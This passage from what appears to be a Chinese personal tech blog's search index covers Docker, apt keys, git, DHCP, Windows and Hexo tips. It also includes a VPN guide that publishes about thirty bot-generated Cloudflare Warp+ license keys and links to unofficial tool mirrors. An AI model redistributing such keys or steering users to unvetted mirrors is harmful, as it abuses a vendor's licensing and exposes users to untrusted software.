在nginx-2这个容器中，使用exit退出之后，查看运行的容器，是查不到的，也就是说，退出意味着停止。\n\n2. 在nginx-3这个容器中，使用<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>停止，停止后查看运行的容器，发现nginx-3容器仍在运行，得出结论使用快捷键退出不会导致容器停止。","tags":["Docker"],"categories":["学习过程"]},{"title":"Docker的虚悬镜像的查看和删除","url":"/2023/08/08/DanglingImage/","content":"\n### 什么是虚悬镜像\n\n虚悬镜像（dangling image）一言以蔽之：镜像既没有仓库名，也没有标签，均为\\<none>\n\n\\<none>      \\<none>     02385df0ef86    3 days ago   123 MB\n\n<!-- more -->\n\n### 查看虚悬镜像\n\n```bash\ndocker images -f dangling=true\n```\n\n### 删除虚悬镜像\n\n```bash\ndocker rmi $(docker images -q -f dangling=true)\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"修复Ubuntu中的“Key is stored in legacy trusted.gpg keyring”问题","url":"/2023/08/06/Remove-aptkey/","content":"\n在Ubuntu下载软件时，经常会安装一些存储秘钥，时间一长就会有一些过期的，不能用的，经常会在`apt udate`时进行检测，卡着很长时间，最后进行警告，非常浪费时间，而且对于强迫症患者来讲，提示警告和提示报错没什么区别，必须解决。\n\n### 解决办法\n\n* 报错信息\n\n```\n有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。\nW: 无法下载 https://typora.io/linux/./InRelease  Could not wait for server fd - select (11: 资源暂时不可用) [IP: 2a03:2880:f10d:183:face:b00c:0:25de 443]\nW: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。\n```\n<!-- more -->\n\n这一共有两个警告，第一个是提示有过期的存储秘钥，第二个是索引文件下载失败。\n\n* 解决索引文件下载失败\n\n注意索引文件的关键字有`typora`，进入存储索引文件的目录`/etc/apt/sources.list.d/`，把相关的文件直接删除即可。\n\n```bash\nknight@knight:~/wechat$ cd /etc/apt/sources.list.d/\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       typora.list       vscode.list.save\ndeepin_appstore.list.save  tickstep-aliyunpan.list       typora.list.save  winehq-focal.sources\ngoogle-chrome.list         tickstep-aliyunpan.list.save  vscode.list\nknight@knight:/etc/apt/sources.list.d$ sudo rm -rf typora.list*\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       vscode.list\ndeepin_appstore.list.save  tickstep-aliyunpan.list       vscode.list.save\ngoogle-chrome.list         tickstep-aliyunpan.list.save  winehq-focal.sources\n```\n\n* 解决有过期的存储秘钥\n\n解决完索引文件的问题之后，警告就变成了：\n\n```bash\n有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。\n```\n\n1. 首先先查看一下系统有多少存储秘钥\n\n```bash\nknight@knight:~/nustarain$ sudo apt-key list\n[sudo] knight 的密码： \nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ 未知 ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/appstore.gpg\n-----------------------------------\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/google-chrome.gpg\n----------------------------------------\npub   rsa4096 2016-04-12 [SC]\n      EB4C 1BFD 4F04 2F6D DDCC  EC91 7721 F63B D38B 4796\nuid             [ 未知 ] Google Inc. (Linux Packages Signing Authority) <linux-packages-keymaster@google.com>\nsub   rsa4096 2021-10-26 [S] [有效至：2024-10-25]\nsub   rsa4096 2023-02-15 [S] [有效至：2026-02-14]\n\n/etc/apt/trusted.gpg.d/microsoft.gpg\n------------------------------------\npub   rsa2048 2015-10-28 [SC]\n      BC52 8686 B50D 79E3 39D3  721C EB3E 94AD BE12 29CF\nuid             [ 未知 ] Microsoft (Release signing) <gpgsecurity@microsoft.com>\n\n/etc/apt/trusted.gpg.d/tickstep-packages-archive-keyring.gpg\n------------------------------------------------------------\npub   rsa4096 2022-07-30 [SCEA]\n      071D E06F 6BCE 212C 5483  CECF 3D4C 35B0 8026 4AA9\nuid             [ 未知 ] tickstep <tickstep@outlook.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg\n------------------------------------------------------\npub   rsa4096 2012-05-11 [SC]\n      8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092\nuid             [ 未知 ] Ubuntu CD Image Automatic Signing Key (2012) <cdimage@ubuntu.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg\n------------------------------------------------------\npub   rsa4096 2018-09-17 [SC]\n      F6EC B376 2474 EDA9 D21B  7022 8719 20D1 991B C93C\nuid             [ 未知 ] Ubuntu Archive Automatic Signing Key (2018) <ftpmaster@ubuntu.com>\n```\n\n2. 可以看到有很多秘钥，然后在报错信息里面找关键字，发现有`deepin`关键字，然后使用 grep 查找，可以筛选出来，符合条件的就只有两个。\n\n```bash\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ 未知 ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n```\n\n3. 将这两个秘钥逐一导出即可，导出时用到秘钥的后8位作为标记（去掉空格）。\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ sudo apt-key export 0A53D5BB | sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/appstore.gpg\nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n```\n\n上面这条命令的意思是：导出秘钥后8位为`0A53D5BB`的秘钥，导出到`/etc/apt/trusted.gpg.d/`目录下，并且命名为`appstore.gpg`。\n\n然后去存储秘钥的目录下验证，发现存在这样的一个文件。\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ ls /etc/apt/trusted.gpg.d/\nappstore.gpg       microsoft.gpg                          ubuntu-keyring-2012-cdimage.gpg\ngoogle-chrome.gpg  tickstep-packages-archive-keyring.gpg  ubuntu-keyring-2018-archive.gpg\n```\n\n4. 最后，`sudo apt-key list`查看导出的秘钥并不会消失，但是执行`sudo apt update`不会再报警告了。\n\n```\n获取:18 http://mirrors.aliyun.com/ubuntu jammy-security/universe amd64 DEP-11 Metadata [39.9 kB] \n命中:19 https://dl.winehq.org/wine-builds/ubuntu focal InRelease                     \n命中:20 http://file.tickstep.com/apt aliyunpan InRelease \n已下载 3,765 kB，耗时 6秒 (654 kB/s)\n正在读取软件包列表... 完成\n正在分析软件包的依赖关系树... 完成\n正在读取状态信息... 完成                 \n有 11 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nknight@knight:~/nustarain$ \n```","tags":["Ubuntu"],"categories":["探索"]},{"title":"Git克隆指定的分支","url":"/2023/08/06/GitSpecifyBranch/","content":"\n### 问题描述\n\n在Git克隆时，有时候我们不一定要克隆主分支，更多的也会遇到克隆其他分支，而在默认的克隆中，会直接克隆主分支，那么如何克隆其他分支呢？\n\n### 解决办法\n\n执行下面的命令\n\n```git\ngit clone --branch <branchname> <remote-repo-url>\n```\n\n<!-- more -->\n\n或者\n\n```git\ngit clone -b <branchname> <remote-repo-url>\n```\n\n这里 -b 只是 --branch 的别名。\n\n这样，你就可以获取仓库中的所有分支，切换到你指定的分支，指定的分支成为本地分支用于 git push 和 git pull。但你仍然从每个分支中获取了所有文件。虽然已经达到了想要的结果，但是这样的效果并不是很令人满意。\n\n这会自动将指定的分支配置为本地分支，但仍会跟踪其他分支。类似这样：\n\n```bash\nknight@knight:~/nustarain$ git remote show origin \n* 远程 origin\n  获取地址：https://gitee.com/nustarain/nustarain.git\n  推送地址：https://gitee.com/nustarain/nustarain.git\n  HEAD 分支：main\n  远程分支：\n    hexo 已跟踪\n    main 已跟踪\n  为 'git pull' 配置的本地分支：\n    hexo 与远程 hexo 合并\n    main 与远程 main 合并\n  为 'git push' 配置的本地引用：\n    hexo 推送至 hexo (最新)\n    main 推送至 main (最新)\n```\n\n如果要单纯的只克隆一个分支，只需要加一个参数即可：\n\n```git\ngit clone --branch <branchname> --single-branch <remote-repo-url>\n```\n\n或者\n\n```git\ngit clone -b <branchname> --single-branch <remote-repo-url>\n```\n\n加上--single-branch就只会跟踪这个指定的分支了。","tags":["Git"],"categories":["学习过程"]},{"title":"移除Ubuntu桌面的家目录文件夹","url":"/2023/08/06/DelDesktopFolder/","content":"\n### 问题描述\n\n由于中文版Ubuntu的系统在个人家目录会显示中文的文件夹（桌面，文档，照片等这些），因为在进入这些目录时需要先修改输入法语言，在使用了一段时间的Ubuntu后，感到实在费劲，所以索性将这些文件夹都改成了对应的英文名字，比如桌面对应“Desktop”，后来导致Ubuntu开机之后，家目录下的文件夹全部都显示到了桌面，真的是丑到极点。\n\n后来经过一番的查找资料，终于找到了解决办法。\n\n### 解决办法\n\n1. 在Ubuntu系统中有一个文件夹管理着家目录的文件夹名字和家目录某种程度上的系统变量的关系。在这个文件夹中记录着系统变量和家目录的对应关系。\n\n<!-- more -->\n\n2. 可以直接查看这个文件`cat ~/.config/user-dirs.dirs`\n\n```bash\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/桌面\"\nXDG_DOWNLOAD_DIR=\"$HOME/下载\"\nXDG_TEMPLATES_DIR=\"$HOME/模板\"\nXDG_PUBLICSHARE_DIR=\"$HOME/公共\"\nXDG_DOCUMENTS_DIR=\"$HOME/文档\"\nXDG_MUSIC_DIR=\"$HOME/音乐\"\nXDG_PICTURES_DIR=\"$HOME/图片\"\nXDG_VIDEOS_DIR=\"$HOME/视频\"\n```\n\n3. 上面是我修改完之前的样子，在修改之后是这样的：\n\n```bash\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/Desktop\"\nXDG_DOWNLOAD_DIR=\"$HOME/Downloads\"\nXDG_TEMPLATES_DIR=\"$HOME/Template\"\nXDG_PUBLICSHARE_DIR=\"$HOME/Public\"\nXDG_DOCUMENTS_DIR=\"$HOME/Document\"\nXDG_MUSIC_DIR=\"$HOME/Music\"\nXDG_PICTURES_DIR=\"$HOME/Picture\"\nXDG_VIDEOS_DIR=\"$HOME/Viedo\"\n```\n\n4. 修改完这个配置文件，然后把家目录的对应文件夹的名字修改为与配置文件一致就OK了！\n\n```bash\nknight@knight:~/.ssh$ cd ~\nknight@knight:~$ ls\naliyun  Desktop   Downloads  nustarain          Public    snap      Viedo\nchrome  dingtalk  Music      package-lock.json  qq        sougou    vs_code\nclash   Document  node       Picture            qq_music  Template  wechat\n```\n\n5. 关机，重启，就会发现桌面的家目录文件夹全都消失了。","tags":["Ubuntu"],"categories":["探索"]},{"title":"Linux配置DHCP服务器","url":"/2023/07/27/conf-dhcp/","content":"\n关于DHCP的配置是在很久之前学习配置的，并没有整理成册，今天闲下心来再把关于DHCP配置的方法回顾一下。\n\n### DHCP配置流程\n\n1. 下载软件包\n\n```bash\nyum install -y dhcp-server\n```\n\n从Centos8开始，关于DHCP的配置，软件包就变成了“dhcp-server”这是服务器端的软件包，与此相对应的还有客户端使用的“dhcp-client”。\n\n<!-- more -->\n\n2. 复制配置文件\n\ndhcp的配置文件是`/etc/dhcp/dhcpd.conf`，但是比较鸡肋的是，这个配置文件是空的，只有三行注释，但是dhcp提供了一个模板文件`/usr/share/doc/dhcp-server/dhcpd.conf.example`，可以直接拷贝过去使用。\n\n因为配置文件有很多注释，看起来非常杂乱，所以执行以下这条命令，直接带走所有注释。\n\n```bash\negrep -v \"^#|^$\" /usr/share/doc/dhcp-server/dhcpd.conf.example > /etc/dhcp/dhcpd.conf\n```\n\n3. 配置文件内容及含义\n\n```bash\n# 定义全局参数：默认搜索域\noption domain-name \"blog.nustarain.com\";\n# 定义全局参数：域名服务器（若是多个域名服务器使用逗号间隔）\noption domain-name-servers ns1.nustarain.com;\n# 定义全局参数：默认租期\ndefault-lease-time 600;\n# 定义全局参数。最大租期\nmax-lease-time 7200;\nlog-facility local7;\n# 定义网络号为10.8.7.0子网掩码为255.255.255.0的子网\nsubnet 10.8.7.0 netmask 255.255.255.0 {\n  # 子网IP地址池的范围\n  range 10.8.7.10 10.8.7.253;\n  # 设置子网的默认网关\n  option routers 10.8.7.254;\n  # 设置子网的广播地址\n  option broadcast-address 10.8.7.255;\n  default-lease-time 600;\n  max-lease-time 7200;\n}\n# 向特殊主机分配特定的IP，当要给多个特殊的主机分配IP时，host 后的名称要求必须唯一\nhost fantasia {\n  # 指定主机的MAC地址\n  hardware ethernet 00:0c:29:af:33:58;\n  # 指定要分配的IP地址\n  fixed-address 10.8.7.68;\n}\n```\n\n在整个DHCP的配置中，要注意DHCP配置文件的语法规则，尤其是分号的使用，稍不留神就会报错。\n配置完配置文件之后，可以使用`dhcpd -t`来进行语法检查，出现下面的语句表示没有错误，反之就要检查错误了。\n\n```bash\nInternet Systems Consortium DHCP Server 4.3.6\nCopyright 2004-2017 Internet Systems Consortium.\nAll rights reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\nldap_gssapi_principal is not set,GSSAPI Authentication for LDAP will not be used\nNot searching LDAP since ldap-server, ldap-port and ldap-base-dn were not specified in the config file\nConfig file: /etc/dhcp/dhcpd.conf\nDatabase file: /var/lib/dhcpd/dhcpd.leases\nPID file: /var/run/dhcpd.pid\nSource compiled to use binary-leases\n```\n\nPlease remember：Practice makes perfect.\n\n### 客户机获取IP地址\n\n相比服务器端的配置，客户机的操作就比较简单一点。\n\n1. 下载软件包。\n\n```bash\nyum install -y dhcp-client\n```\n\n2. （可选），如果当前网卡已经是动态获取的模式，那么就不需要改配置文件了，如果网卡是静态指定的，那么就需要修改一下。网卡配置文件路径`/etc/sysconfig/network-scripts/ifcfg-ens160`，修改里面的`BOOTPROTO=dhcp`，保存退出。\n\n3. 执行命令更新重启网卡。\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n4. 相关命令。\n\n```bash\ndhclient ens160    # 自动获取IP地址\ndhclient -r ens160    # 释放当前IP\n```","tags":["Linux"],"categories":["技术"]},{"title":"science online的终极解决方案","url":"/2023/07/25/science-network/","content":"\n从我有了第一台电脑后，science online的手段也逐渐见证着我的成长，从最初的浏览器插件上网，到SSR的小飞机，再到V2ray，以及后面陪伴我最久的clash。可以说已经是身经百战的老油条了。到今天我又遇到了一个具有里程碑式的science online手段**CloudFlare+Warp+ 优选IP**。\n\nCloudFlare拥有极高的业界权威，拥有顶尖的技术团队，拥有最安全的网络方案，他们公司的推出的science online技术那是无形中代表了一个技术标准的。在我实际体验下来，效果确实非常好，很舒服。\n\n<!-- more -->\n\n### 环境准备\n\n虽说是教程，但可不是从0开始的教程。\n\n* 需要拥有telegram账号和客户端，客户端可以是安卓、windows、Mac、iOS、Linux。\n\n* [telegram官网](https://telegram.org/)\n\n### 获取Warp+的永久免费流量\n\n需要在telegram里搜索一个机器人，机器人叫“warp+ bot”，但是我试了一下，直接搜是搜不出来的，后来发现可以通过链接直接找到他，[链接地址](https://t.me/generatewarpplusbot)\n\n![telegram](./science-network/1.jpg)\n\n* 找到这个机器人之后，发送指令`/generate`\n\n* 然后他会让你关注两个类似公众号的东西，就是图中的`Warp Plus`和`akame.moe enjoyers`直接按他的意思进行关注\n\n* 再次发送`/generate` 然后他会进行真人验证，给你出一道一位数相加的数学题\n\n* 按照他的题，把答案写在命令之后，比如图中的`/generate 8`，然后就可以拿到一个秘钥，把这个秘钥留好，待会要用到。（其实不留好也没关系，丢了可以再申领一个，而且每个秘钥含的流量已经超过2EB了，所以说根本用不完，就差把永久免费写在脑门上了）\n\n我也向大家提供几个可以直接使用的秘钥：\n\n```bash\n🔐 Key: T23Xt4d0-w6J8K04D-18l5xeE6 (24598562 GB)\n🔐 Key: A7o25Ti0-6L73vi2x-85oL63gt (24598562 GB)\n🔐 Key: l8PNO546-Lt90kn31-O659R1rZ (24598562 GB)\n🔐 Key: 8Rh75w0a-7xO04f5W-B32tI8n9 (24598562 GB)\n🔐 Key: jmB9306F-789SI6ph-7S365JVv (24598562 GB)\n🔐 Key: 164biRE3-ct261Rh3-8y9RC6L5 (24598562 GB)\n🔐 Key: 73sH81gV-7dDQ239P-5br73p6L (24598562 GB)\n🔐 Key: 9BH18g0q-8TV9U6r4-zcDr8703 (24598562 GB)\n🔐 Key: w9L6WQ14-t375aI2F-91j27zEW (24598562 GB)\n🔐 Key: L76Hzc89-pN9r36S0-T85Jw0z9 (24598562 GB)\n🔐 Key: hV25y10g-0Hi678gc-9b06HL5F (24598562 GB)\n🔐 Key: 4BLI280U-B5c9d17X-57b89Njn (24598562 GB)\n🔐 Key: 0e3d75yj-ga82N70x-YG3a5C06 (24598562 GB)\n🔐 Key: N2C143ct-uea678k1-8mUot240 (24598562 GB)\n🔐 Key: 6y4g9f7j-H198qdA6-9F2G8vw0 (24598562 GB)\n🔐 Key: EGR3r108-eU0m381t-8Ec26i9t (24598562 GB)\n🔐 Key: zg2B0W41-S16ye8m5-kEQ64R05 (24598562 GB)\n🔐 Key: vgs159Q0-6OQe9v07-aj2385TU (24598562 GB)\n🔐 Key: 6dU2q39L-207jq8nP-3V4L6Sl2 (24598562 GB)\n🔐 Key: 19Gk4bL0-9V8XPS64-g72TEu90 (24598562 GB)\n🔐 Key: C2045eQc-n0841qKY-4vV3jY08 (24598562 GB)\n🔐 Key: p58J1O4H-P14tT65z-8Rr36mv4 (24598562 GB)\n🔐 Key: 24n6m9eh-9T0jH35K-5k71A9mf (24598562 GB)\n🔐 Key: 8dIB52E1-3s19ar7z-apS65f73 (24598562 GB)\n🔐 Key: z4jG2I08-ha5Y2c17-5U8qi39F (24598562 GB)\n🔐 Key: 2mp506db-L57S9Mu2-ey2WI461 (24598562 GB)\n🔐 Key: 13R58eyJ-d79iD3I0-7Z64mz9L (24598562 GB)\n🔐 Key: 154vY2qO-Kb51S83l-2J04FdQ7 (24598562 GB)\n🔐 Key: 132oL6bq-K4S3oz05-h5324nxf (24598562 GB)\n🔐 Key: f107WP6Q-g1e3wF74-18Q7lt5S (24598562 GB)\n```\n\n### 下载代理工具\n\n这次需要的代理工具是wireguard，[官方下载链接](https://www.wireguard.com/install/)\n\n[备用下载地址](https://pan.baidu.com/s/1Dlg26xlYBnfWNVXx0PWTdA?pwd=trha)\n提取码：trha\n\n下载完直接安装就OK。\n\n这是软件的截图。\n\n![wireguard软件截图](./science-network/2.png)\n\n新用户没有配置是不会有配置信息的\n\n* 首先左下角找到这个下拉框，点击新建空隧道\n\n* 会让你起一个名字，随便起一个名字就好\n\n* 公钥的部分不要动\n\n* 再往下的文本块是配置信息，然后把画面停在这里，最小化，我们去生成配置信息\n\n### 生成配置信息\n\n利用一个在线的工具生成配置信息，[工具链接地址](https://replit.com/@misaka-blog/wgcf-profile-generator?v=1)\n\n![网站截图](./science-network/3.png)\n\n进入网站后，点击右上角的Run，稍等片刻\n\n![开始配置](./science-network/4.png)\n\n出现这个画面后，因为我们使用的是秘钥，对应的选项是2，输入2后回车。\n\n![开始配置](./science-network/5.png)\n\n这里让输入秘钥，就是之前在telegram获取的秘钥，粘贴在这里后回车。\n\n之后会要求输入一个随机设备名，随便输入一个字符串回车就好。\n\n![开始配置](./science-network/6.png)\n\n生成的红色部分就是配置信息，把配置信息复制下来，然后粘贴在wireguard的文本块里，就像这样。\n\n![开始配置](./science-network/7.png)\n\n最后保存配置信息。\n\n大多数情况下是没有办法直接使用的，因为现在拿到的IP并不是最优IP，所以需要另一个工具来帮助筛选最优的IP，需要注意的是，如果目前有在使用任何的代理或者science online工具必须要停下来，不然会极度影响最优IP的筛选。\n\n### 筛选最优IP\n\n[工具下载链接](https://gitlab.com/Misaka-blog/warp-script/-/blob/main/files/warp-yxip/warp-yxip-win.7z)\n\n[备用下载链接](https://pan.baidu.com/s/1UZZsxrOWu-PglAx9IYFBKA?pwd=je5f)\n提取码：je5f\n\n这个工具是完全免费开源的，可以放心使用。\n\n下载完解压，有一个`warp-yxip.bat`的文件，双击运行\n\n![运行效果](./science-network/8.png)\n\n选择IPV4的筛选，输入1，回车，等待片刻，进程运行完毕后，会在工具的目录下生成一个result的文件使用Excel打开。\n\n![效果如图](./science-network/9.png)\n\n* LOSS 是丢包率\n\n* DELAY 是延迟\n\n默认会把结果按从优到差进行排序，只需要从前面几个抽一个，复制好IP和端口号然后替换掉wireguard配置文件里的最后一项，比如`Endpoint = 162.159.192.160:894`。\n\n补充一点，在wireguard里，如果需要再对配置文件进行更改，可以直接右击配置名称，选择“编辑所选隧道”。\n\n配置到这里，就完成了，可以进行连接，开始science online旅程了。","tags":["science online"],"categories":["小玩意儿"]},{"title":"Win11切换Win10经典右击菜单栏","url":"/2023/07/21/classic-menu/","content":"\n相信有不少升级为Win11的小伙伴对Win11的折叠右击菜单非常不舒服，平常只需要一次右击的事情，现在还要展开更多，再去找需要的工具。非常影响使用体验，接下来，告诉大家不用下载任何第三方软件，也不用手动修改注册表，只需要执行两条命令就会自动修改注册表的方法。\n\n### 切换Win10经典右击菜单栏\n\n<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n<!-- more -->\n\n```bash\nreg add \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\InprocServer32\" /f /ve\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```\n\n### 恢复Win11右击菜单栏\n\n既然可以切换到Win10的菜单栏，那自然也可以恢复为Win11的菜单栏。同样的，<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n```bash\nreg delete \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\" /f\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```","tags":["Windows"],"categories":["小玩意儿"]},{"title":"设置博客背景动态特效","url":"/2023/07/17/FlyLine/","content":"\n### 修改配置文件\n\n静态的博客实在是太单调了，增加一点动态的效果吧。\n\n1. 同添加背景图片一样，同样需要打开一个开关，也就是取消footer这个注释。\n\n<!-- more -->\n\n```yml\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n  ```\n\n2. 取消注释以后，创建这样的一个文件source/_data/footer.swig，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```js\n<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>\n```\n\n* color设置的是线条的RGB值。\n* opacity设置的是类似透明度的数值。\n* count设置的是线条的数量。\n\n重新生成一下配置，就会出现效果了。","tags":["博客美化"],"categories":["博客搭建"]},{"title":"设置博客背景图片","url":"/2023/07/17/BGPic/","content":"\n### 修改NEXT的配置文件\n\n我一直使用的是Next的主题，这个主题默认是可以自定义一些样式的。\n\n1. 首先选择一张心仪的背景图片，添加到themes/next/source/images/xx.jpg。我建议图片的大小最好控制一下，最好控制在400k-500K左右，动辄几兆大小的背景图片网页加载起来会很吃力，非常影响实际体验。\n\n2. 然后需要打开这个开关，也就是取消style这个注释\n\n<!-- more -->\n\n```yml\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  #footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n  ```\n\n3. 取消注释以后，创建这样的一个文件source/_data/styles.styl，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```yml\nbody {\n \tbackground:url(/images/xx.jpg);\n \tbackground-repeat: no-repeat;\n    background-attachment:fixed;\n    background-position:100% 100%;\n}\n```\n\n* background:url 为图片路径，也可以直接使用链接。\n* background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕\n* background-attachment：背景是否随着网页上下滚动而滚动，fixed 为固定\n* background-size：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示。\n\n重新生成一下配置，就会出现效果了。","tags":["博客美化"],"categories":["博客搭建"]},{"title":"博客评论系统之changyan","url":"/2023/07/17/changyan-comment/","content":"\n### 搭建原因\n\n之前在博客搭建了评论的板块，但是因为使用的是gitalk的评论功能，如果访客要进行评论的话，首先必须拥有一个github的账号，但绝大多数人如果不做这一行，不向开发靠拢，就很大程度上没有github的账号。基于这样的原因，我又重新寻找评论的插件，终于找到了适合国人的评论插件“畅言”。畅言是支持手机号、QQ账号、微信账号登录使用的，很符合我的需求，于是简单了解了一下搭建的方法，在这里分享给大家。\n\n### 条件准备\n\n1. 使用畅言评论，我们首先要去[畅言评论官网](https://changyan.kuaizhan.com/)注册一个账号。\n\n<!-- more -->\n\n紧接着我们需要添加一个站点，按照要求来就OK。站点名称随便输入，网址是你的网站的域名，白名单选填，直接跳过就OK，站点类型按照下拉框选择就好，网站logo有就添加，没有可以不添加。总的来讲，只有站点网站这一个框比较重要。\n\n![添加站点](./changyan-comment/1.png)\n\n2. 找到ID和SECRET。\n\n注册好之后，在后台总览可以找到这两个参数，这两个参数待会还有别的用处。\n\n![添加站点](./changyan-comment/2.png)\n\n3. 修改NEXT的主题配置文件。\n\n将comment的active值修改为changyan。\n\n```yml\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: changyan\n```\n\n然后进行changyan的主配置修改，将enable值改为true，下面的appid和appkey对应畅言官网的APP ID和APP SECRET。\n\n```yml\nchangyan:\n  enable: true # false\n  appid: c*******s\n  appkey: 48a****b8**2328cd*****ab****50d7\n  # Show comments count\n  count: true\n```\n\n修改完成后，可以在博客上看到畅言评论的评论区了，如下图所示：\n\n![添加站点](./changyan-comment/3.png)\n\n4. 对评论区的功能进行更多的设置。\n\n可以在主页系统设置的通用设置里设置审核规则，是否允许用图片进行评论，官方回复使用的昵称和头像。\n\n![添加站点](./changyan-comment/4.png)\n\n可以在主页系统设置的PC版设置里的显示配置，进行评论区的显示配置。\n\n![添加站点](./changyan-comment/5.png)\n\n还可以设置主题的样式。\n\n![添加站点](./changyan-comment/6.png)","tags":["博客评论"],"categories":["博客搭建"]},{"title":"博客评论系统之gitalk","url":"/2023/07/14/gitalk-comment/","content":"\n### 背景介绍\n\n自己一味的输出，倘若收不到别人的反馈，自己也是不会进步的，博客的质量也就只会在当前的水平停止不前，在这样的影响下，我决心要给博客打造一个评论系统，于是我花了点时间深入研究了博客的评论的系统搭建。\n\n最初，我选择的是github的gitalk。\n\n### 环境说明\n\n我的博客基于hexo，使用的是next主题，这个主题安装之后，在主题的配置文件中，默认存在几个关于评论的系统板块，我们只要针对gitalk这个板块编辑就OK。\n\n<!-- more -->\n\n### 创建仓库\n\n1. 直接在github首页创建一个仓库，用来存储博客的评论，相当于一个数据库的作用。\n\n* 首先填写一个仓库名字，下面报红是因为我已经创建过一个了。\n* 仓库描述的话选填，可写可不写。\n* 选择为public。\n* 最后点击创建仓库。\n\n![创建仓库](./gitalk-comment/1.png)\n\n2. 